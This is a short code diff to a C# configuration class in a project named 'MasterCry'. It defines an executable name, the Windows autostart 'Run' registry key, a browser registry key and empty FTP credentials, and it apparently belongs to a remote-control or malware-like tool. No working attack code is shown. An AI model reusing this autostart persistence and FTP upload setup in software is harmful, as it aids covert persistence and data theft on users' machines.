@@ -28,7 +28,8 @@ namespace MasterCry
         public static string Exe_Name = "command.exe";
         public static string Config_Command_Version = "CommandVersion";
         public static string Registry_AppName = "ApplicationName";
-        public static string Registry_Key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+        public static string Registry_Key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+        public static string Registry_Key_Browser = @"SOFTWARE\Clients\StartMenuInternet";
         public static string FTP_SERVER = "";
         public static string FTP_USER = "";
         public static string FTP_PASS = "";
